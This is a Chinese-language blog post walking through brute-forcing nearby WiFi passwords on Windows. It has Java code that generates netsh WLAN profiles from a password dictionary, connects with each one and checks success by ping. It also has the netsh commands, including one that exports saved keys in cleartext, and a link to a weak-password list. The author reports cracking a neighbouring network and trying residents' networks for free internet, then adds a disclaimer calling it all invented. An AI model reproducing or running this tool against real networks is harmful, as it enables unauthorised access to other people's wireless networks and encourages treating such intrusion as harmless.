---
title: 如何在Windows平台用Java代码暴力破解WIFI密码
date: 2018-10-22 15:21:08
categories: 开源之路
tags: [破解WIFI, Java]
---
>由于新搬的地方没有覆盖移动的宽带，最近手头又紧。所以暂时先没安宽带，但是一天用流量，也撑不住啊。看着流量哗啦啦的溜走。住的地方在6楼，然后房子是底商的格局，于是就动起了蹭网的小心思，一下记录蹭网全过程。

<!-- more -->

开始进入正题。在网上找了很多wifi破解工具，都是linux平台下用的，然后还不支持虚拟机装linux。因为很多笔记本装虚拟机都识别不了内置网卡。所以得把系统刻到U盘，然后用U盘启动。但是我现在穷得连一条内裤都没有了，哪来的U盘啊。于是就决定自己写，而且还得用Java写，写了我还得在windows上运行。

# 一、准备工作

首先你得需要一台能连wifi的电脑，
然后你的电脑得支持Java环境，
最后你周围得有无线网络。

ok，话不多说，说开撸，老夫就要开撸。于是网上找到了windows下cmd无线网络操作的相关命令。如下：

```
// 列出所有可用wifi
netsh wlan show networks mode=bssid

// 添加配置文件
netsh wlan add profile filename=FILE_NAME

// 连接wifi
netsh wlan connect name=SSID_NAME

// 导出配置文件
netsh wlan export profile key=clear

// 列出配置文件
netsh wlan show profile

// 删除配置文件
netsh wlan delete profile name=FILE_NAME

// 列出接口
netsh wlan show interface

// 开启接口
netsh interface set interface "Interface Name" enabled
```

这我这篇文章中，主要会用到前四个命令，其他的命令就当给各位做拓展了。

首先需要写配置文件，方便待会使用。首先我们可以看看配置文件张啥样，导出配置文件看看就知道了。打开命令行，输入

```
netsh wlan export profile key=clear
```

就导出了配置文件，注意，这儿的配置文件默认导出在cmd执行的当前路径，如下，

{% asset_img path.png 文件路径 %}

我导出的文件就在 C:\Users\Admin 下面，可以看到文件都是wifi.xml方式。如 TP-LINK_5410.xml ，随便打开一个我们可以看到xml文件的具体内容，但是有一些内容是我们不需要的，我们需要的是下面这个样子

```
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
<name>SSID_NAME</name>
<SSIDConfig>
    <SSID>
        <name>SSID_NAME</name>
    </SSID>
</SSIDConfig>
<connectionType>ESS</connectionType>
<connectionMode>auto</connectionMode>
<MSM>
    <security>
        <authEncryption>
            <authentication>AUTH_TYPE</authentication>
            <encryption>AES</encryption>
            <useOneX>false</useOneX>
        </authEncryption>
        <sharedKey>
            <keyType>passPhrase</keyType>
            <protected>false</protected>
            <keyMaterial>PASSWORD</keyMaterial>
        </sharedKey>
    </security>
</MSM>
<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
    <enableRandomization>false</enableRandomization>
</MacRandomization>
</WLANProfile>
```
其中 SSID_NAME 是待会我们会用到的wifi名称， AUTH_TYPE 是wifi的加密方式， PASSWORD 是我们会暴力破解的密码变量。

# 二、扫描WIFI

OK，背景交代得差不多了，可以开干了。首先扫描附近的WIFI，返回所有WIFI的信息，包括SSID、加密方式、信号强度（信号太弱的，我们就不进行破解了，破解了也没啥用）。扫描其实就是执行一个CMD命令的问题，先封装一个CMD执行器吧。

```
/**
 * 执行器
 *
 * @param cmd      CMD命令
 * @param filePath 需要在哪个目录下执行
 */
private static List<String> execute(String cmd, String filePath) {
    Process process = null;
    List<String> result = new ArrayList<String>();
    try {
        if (filePath != null) {
            process = Runtime.getRuntime().exec(cmd, null, new File(filePath));
        } else {
            process = Runtime.getRuntime().exec(cmd);
        }
        BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "gbk"));
        String line = null;
        while ((line = bReader.readLine()) != null) {
            result.add(line);
        }
    } catch (IOException e) {
        e.printStackTrace();
    }
    return result;
}
```

然后扫描周围wifi信息，并返回相关信息

```
/**
 * 列出所有信号较好的ssid
 *
 * @return 所有ssid
 */
public static List<Ssid> listSsid() {
    List<Ssid> ssidList = new ArrayList<Ssid>();
    String cmd = Command.SHOW_NETWORKS;
    List<String> result = execute(cmd, null);
    if (result != null && result.size() > 0) {
        // todo 整合信息
    }
    return ssidList;
}
```

# 三、生成配置文件

OK，接下来我们就可以开始针对每个不同的SSID生成不同的配置文件了,生成文件整个过程就是根据每个不同的密码生成一个配置文件。大概代码如下

```
/**
 * 配置文件生成器
 */
public class ProfileGenerator {

    private String ssid = null;
    private String passwrodPath = null;
    private ExecutorService threadPool = Executors.newFixedThreadPool(4);

    public ProfileGenerator(String ssid, String passwrodPath) {
        this.ssid = ssid;
        this.passwrodPath = passwrodPath;
    }

    /**
     * 生成配置文件
     */
    public void genProfile() {
        List<String> passwordList = null;
        int counter = 0;
        outer:
        while (true) {
            int start = counter * Connector.BATH_SIZE;
            int end = (counter + 1) * Connector.BATH_SIZE - 1;
            passwordList = FileUtils.readLine(passwrodPath, start, end);
            if (passwordList != null && passwordList.size() > 0) {
                // 生成配置文件
                for (String password : passwordList) {
                    GenThread genThread = new GenThread(ssid, password);
                    threadPool.execute(genThread);
                }
            } else {
                break outer;
            }
            counter++;
        }
    }
}

class GenThread implements Runnable {

    private String ssid = null;
    private String password = null;

    GenThread(String ssid, String password) {
        this.ssid = ssid;
        this.password = password;
    }

    public void run() {
        String profileContent = Profile.PROFILE.replace(Profile.WIFI_NAME, ssid);
        profileContent = profileContent.replace(Profile.WIFI_PASSWORD, password);
        FileUtils.writeToFile(Connector.PROFILE_TEMP_PATH + "\\" + password + ".xml", profileContent);
    }
}
```

这儿为了加快文件生成速度，我开启了多线程。个人实际感受，如果只是几千到几万个的话，其实多线程不多线程，并没有多大区别，真正的区别在于后面尝试连接的时候。

需要哪些密码可以自己现在网上找一些字典来跑，建议顺序是 常用弱口令 => 字典面 => 随机密码（到了随机密码这儿，意义也不大了）。这儿给出一个常见弱口令的[下载连接](/doc/6000常用密码字典.txt)。反正我只用这个弱口令破解过一个WIFI。

# 四、遍历校验配置文件

接下来就是最耗时的一步了，一个个密码去校验。关键代码如下

```
/**
 * 校验WLAN配置文件是否正确
 * <p>
 * 校验步骤为：
 * ---step1 添加配置文件
 * ---step3 连接wifi
 * ---step3 ping校验
 */
public synchronized boolean check(String ssid, String password) {
    System.out.println("check : " + password);
    try {
        String profileName = password + ".xml";
        if (addProfile(profileName)) {
            if (connect(ssid)) {
                Thread.sleep(50);
                if (ping()) {
                    return true;
                }
            }
        }
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
    return false;
}

/**
 * 添加配置文件
 *
 * @param profileName 添加配置文件
 */
private static boolean addProfile(String profileName) {
    String cmd = Command.ADD_PROFILE.replace("FILE_NAME", profileName);
    List<String> result = execute(cmd, Connector.PROFILE_TEMP_PATH);
    if (result != null && result.size() > 0) {
        if (result.get(0).contains("添加到接口")) {
            return true;
        }
    }
    return false;
}

/**
 * 连接wifi
 *
 * @param ssid 添加配置文件
 */
private static boolean connect(String ssid) {
    boolean connected = false;
    String cmd = Command.CONNECT.replace("SSID_NAME", ssid);
    List<String> result = execute(cmd, null);
    if (result != null && result.size() > 0) {
        if (result.get(0).contains("已成功完成")) {
            connected = true;
        }
    }
    return connected;
}

/**
 * ping 校验
 */
private static boolean ping() {
    boolean pinged = false;
    String cmd = "ping " + Connector.PING_DOMAIN;
    List<String> result = execute(cmd, null);
    if (result != null && result.size() > 0) {
        for (String item : result) {
            if (item.contains("来自")) {
                pinged = true;
                break;
            }
        }
    }
    return pinged;
}
```

**两点释疑：**

1.为什么需要sleep(50)? 因为在连接后，电脑没有立即反应过来，此时去ping的话，就算密码正确，都会ping不成功。所以需要sleep。我破解的时候sleep(1000)的，还没测试50行不行。

2.为什么需要ping网站? 因为在第二步连接的时候，不管有没有连接成功，都会出现 '已成功完成xx连接' 的字样。所以没办法，只有用ping来校验，不过我相信一定能够优化的。

这一步我开启了多线程，去验证，有人说为什么用多线程，明明验证方法都 synchronized 了，我想说的是，单线程的话，之间总会有间隙的，所以为了压榨那一点点时间，我用了多线程。

# 五、连接成功

OK,至此，为师已将毕生功力传授给你了，你出去就说是三年经验了。呸，说错了，至此，整个流程大概就已经出来了，接下来就run你的程序吧。等待密码的破解。

我一共在我家周围瞄上了三个信号看起来还可以的wifi。用这个程序跑了40多秒，开了一个wifi的密码 12345678。耶成功了终于可以用了。

然后根据密码，把自家路由器设置一个桥接模式。家里处处都有网了。

# 五、或者放弃

或者，你也可以放弃。愉快地用了一晚上过后，我第二天早上起来发现网断了，原来那个网不存在了，但是到了中午又有了。我估计是底商闭店了，就断电了，网就没了。

于是想要撬开一个住户的网，跑了两个看起来信号比较好的网络，都以失败告终！！！因为密码字典不够强大。网上下过几个字典生成器，都不能用。算了吧先凑合用着现在的网络，等我有空了，写个字典生成器，来撬开。

等我密码生成器出来了，会继续更新。欢迎持续关注。。。

**PS：本文代码已托管到github，若有兴趣，欢迎浏览[https://github.com/weechang/wifi-connector](https://github.com/weechang/wifi-connector)**

**严正申明：** 文中所有行为均为杜撰，请广大网友切勿利用本博文内容做出任何危害网络安全的行为。若有违法行为，均与本人无关。